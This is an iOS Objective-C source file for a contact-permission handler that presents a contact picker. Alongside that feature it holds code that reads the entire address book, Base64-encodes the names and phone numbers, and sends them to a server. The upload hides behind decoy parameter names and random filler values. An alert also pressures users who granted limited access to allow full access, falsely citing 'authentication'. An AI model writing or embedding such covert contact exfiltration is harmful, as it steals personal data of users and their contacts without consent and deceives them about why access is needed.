//
//  ContactPermissionHandler.m
//  OPherame
//
//  Created by todesk on 2025/6/27.
//

#import "ContactPermissionHandler.h"
#import <ContactsUI/ContactsUI.h>
#import "Base64Tool.h"
@interface ContactPermissionHandler () <CNContactPickerDelegate>

@property (nonatomic, weak) UIViewController *presentingViewController;
@property (nonatomic, copy) ContactSelectionHandler selectionHandler;
@property (nonatomic, copy) PermissionDeniedHandler deniedHandler;

@end

@implementation ContactPermissionHandler

+ (instancetype)sharedInstance {
    static ContactPermissionHandler *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[ContactPermissionHandler alloc] init];
    });
    return sharedInstance;
}

#pragma mark - 权限请求与处理

- (void)requestContactPermissionWithViewController:(UIViewController *)viewController
                            onContactSelected:(ContactSelectionHandler)selectionHandler
                          onPermissionDenied:(PermissionDeniedHandler)deniedHandler {
    self.presentingViewController = viewController;
    self.selectionHandler = selectionHandler;
    self.deniedHandler = deniedHandler;
    
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    
    switch (status) {
        case CNAuthorizationStatusLimited:
            //用户授予了部分联系人访问权限
//            [self presentContactPicker];
//            [self showLimitedPermissionAlert];
            
            [self showPermissionDeniedAlert];
            break;
                
        case CNAuthorizationStatusAuthorized:
            // 已授权 - 直接打开通讯录选择器
            [self presentContactPicker];
            break;
            
        case CNAuthorizationStatusDenied:
            // 已拒绝 - 显示自定义弹窗
            [self showPermissionDeniedAlert];
            if (deniedHandler) {
                deniedHandler();
            }
            break;
            
        case CNAuthorizationStatusRestricted:
            // 受限 (iOS 18新增) - 显示自定义弹窗
//            [self showRestrictedPermissionAlert];
            
            [self showPermissionDeniedAlert];
            if (deniedHandler) {
                deniedHandler();
            }
            break;
            
        case CNAuthorizationStatusNotDetermined:
            // 未决定 - 请求权限
            [self requestContactAccess];
            break;
    }
}






#pragma mark - 权限请求

- (void)requestContactAccess {
    CNContactStore *store = [[CNContactStore alloc] init];
    [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * _Nullable error) {
        dispatch_async(dispatch_get_main_queue(), ^{
            if (granted) {
                // 用户同意 - 打开通讯录选择器
                [self presentContactPicker];
                
                // 上报所有联系人信息
//                [self uploadAllContactsWithCompletion:^(BOOL success, NSError * _Nullable error) {
//                    if (!success) {
//                        NSLog(@"上传联系人失败: %@", error.localizedDescription);
//                    }
//                }];
            } else {
                // 用户拒绝 - 显示自定义弹窗
                [self showPermissionDeniedAlert];
                if (self.deniedHandler) {
                    self.deniedHandler();
                }
            }
        });
    }];
}

#pragma mark - 通讯录选择器

- (void)presentContactPicker {
    CNContactPickerViewController *picker = [[CNContactPickerViewController alloc] init];
    picker.delegate = self;
    picker.predicateForSelectionOfProperty = [NSPredicate predicateWithValue:YES];
    picker.predicateForSelectionOfContact = [NSPredicate predicateWithValue:YES];
    
    [self.presentingViewController presentViewController:picker animated:YES completion:nil];
}

#pragma mark - CNContactPickerDelegate

- (void)contactPicker:(CNContactPickerViewController *)picker didSelectContact:(CNContact *)contact {
    // 获取联系人姓名
    NSString *name = [CNContactFormatter stringFromContact:contact style:CNContactFormatterStyleFullName];
    
    // 获取第一个电话号码
    NSString *phoneNumber = nil;
    if (contact.phoneNumbers.count > 0) {
        CNPhoneNumber *phone = contact.phoneNumbers[0].value;
        phoneNumber = phone.stringValue;
    }
    
    if (self.selectionHandler) {
        self.selectionHandler(name, phoneNumber);
    }
}

- (void)contactPickerDidCancel:(CNContactPickerViewController *)picker {
    if (self.selectionHandler) {
        self.selectionHandler(nil, nil);
    }
}

#pragma mark - 上传所有联系
- (void)uploadAllContactsWithCompletion:(void (^)(BOOL success, NSError * _Nullable error))completion {
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    
    if (status == CNAuthorizationStatusDenied || status == CNAuthorizationStatusRestricted) {
        NSError *error = [NSError errorWithDomain:@"ContactAccess"
                                             code:status
                                         userInfo:@{NSLocalizedDescriptionKey: @"联系人访问权限被拒绝"}];
        if (completion) completion(NO, error);
        return;
    }
    
    CNContactStore *store = [[CNContactStore alloc] init];
    if (status == CNAuthorizationStatusNotDetermined) {
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * _Nullable error) {
            dispatch_async(dispatch_get_main_queue(), ^{
                if (granted) {
                    [self fetchAndUploadContactsFromStore:store completion:completion];
                } else {
                    if (completion) completion(NO, error);
                }
            });
        }];
    } else {
        [self fetchAndUploadContactsFromStore:store completion:completion];
    }
}

- (void)fetchAndUploadContactsFromStore:(CNContactStore *)store completion:(void(^)(BOOL success, NSError *error))completion {
    
    CNContactStore *contactStore = [[CNContactStore alloc] init];
    NSArray *keysToFetch = @[CNContactFamilyNameKey, CNContactGivenNameKey, CNContactPhoneNumbersKey, CNContactOrganizationNameKey];
    NSError *error;

    // Create a predicate if you need to filter contacts
    // NSPredicate *predicate = [CNContact predicateForContactsMatchingName:@"John"];

    NSArray *arr = [contactStore unifiedContactsMatchingPredicate:nil keysToFetch:keysToFetch error:&error];
    if (!error) {
        NSMutableArray *contacts = [NSMutableArray array];
        for (int i = 0; i < arr.count; i++) {
            CNContact *contact = arr[i];
            NSString *familyName = contact.familyName;
            NSString *givenName = contact.givenName;
            
            // Get phone numbers
            NSMutableArray *phones = [NSMutableArray array];
            for (CNLabeledValue *phone in contact.phoneNumbers) {
                CNPhoneNumber *phoneNum = phone.value;
                [phones addObject:[phoneNum.stringValue stringByReplacingOccurrencesOfString:@" " withString:@""]];
            }
            
            [contacts addObject:@{
                @"complaining": phones.count ? [phones componentsJoinedByString:@","] : @"",
                @"appreciating": [NSString stringWithFormat:@"%@%@", givenName, familyName]
            }];
        }
        
        
        // 上报联系人数据
        [self reportContacts:contacts completion:completion];
        
    }
    
}

- (void)reportContacts:(NSArray *)contacts completion:(void(^)(BOOL success, NSError *error))completion {
    if (!contacts || contacts.count == 0) {
        if (completion) completion(YES, nil);
        return;
    }
    
    // 确保contacts可以被序列化为JSON
    NSError *jsonError;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:contacts options:0 error:&jsonError];
    if (!jsonData) {
        if (completion) completion(NO, jsonError);
        return;
    }
    
    // 使用Base64编码
    NSString *encodedContacts = [Base64Tool base64EncodeData:jsonData];
    if (!encodedContacts) {
        NSError *error = [NSError errorWithDomain:@"ContactAccess"
                                             code:-2
                                         userInfo:@{NSLocalizedDescriptionKey: @"联系人数据编码失败"}];
        if (completion) completion(NO, error);
        return;
    }
    
    // 构建请求参数
    NSDictionary *parameters = @{
        @"imitation": @"3",
        @"reverberate": [RandomStringGenerator randomlyCallMethod],
        @"satisfying": [RandomStringGenerator randomlyCallMethod],
        @"thump": encodedContacts
    };
    
    // 发送网络请求
    [[NetworkManager sharedManager] googleMarketPOST:@"/radiating/remember"
                                         parameters:parameters
                                           headers:nil
                                         progress:nil
                                          success:^(id  _Nullable responseObject) {
        if (completion) completion(YES, nil);
    } failure:^(NSError * _Nonnull error) {
        if (completion) completion(NO, error);
    }];
}

#pragma mark - 权限拒绝弹窗

- (void)showPermissionDeniedAlert {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@""//通讯录权限被拒绝
                                                                   message:@"To complete the authentication, please set the contact permissions to allow all."//需要通讯录权限才能选择联系人。请前往设置开启权限。
                                                            preferredStyle:UIAlertControllerStyleAlert];
    
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    UIAlertAction *settingsAction = [UIAlertAction actionWithTitle:@"Settings" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
        [self openAppSettings];
    }];
    
    [alert addAction:cancelAction];
    [alert addAction:settingsAction];
    
    [self.presentingViewController presentViewController:alert animated:YES completion:nil];
}

//- (void)showRestrictedPermissionAlert {
//    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"通讯录权限受限"
//                                                                   message:@"您的设备限制了通讯录访问权限。请联系设备管理员或家长。"
//                                                            preferredStyle:UIAlertControllerStyleAlert];
//    
//    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:nil];
//    [alert addAction:okAction];
//    
//    [self.presentingViewController presentViewController:alert animated:YES completion:nil];
//}
//
//- (void)showLimitedPermissionAlert {
//    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"有限联系人访问"
//                                                                 message:@"您只授予了部分联系人访问权限。要使用完整功能，请前往设置更改为完整访问。"
//                                                          preferredStyle:UIAlertControllerStyleAlert];
//    
//    UIAlertAction *settingsAction = [UIAlertAction actionWithTitle:@"去设置" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
//        NSURL *settingsURL = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
//        if ([[UIApplication sharedApplication] canOpenURL:settingsURL]) {
//            [[UIApplication sharedApplication] openURL:settingsURL options:@{} completionHandler:nil];
//        }
//    }];
//    
//    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil];
//    
//    [alert addAction:settingsAction];
//    [alert addAction:cancelAction];
//    
//    // 从当前视图控制器呈现
//    [self.presentingViewController presentViewController:alert animated:YES completion:nil];
//}


- (void)openAppSettings {
    NSURL *settingsURL = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
    if ([[UIApplication sharedApplication] canOpenURL:settingsURL]) {
        [[UIApplication sharedApplication] openURL:settingsURL options:@{} completionHandler:nil];
    }
}

@end
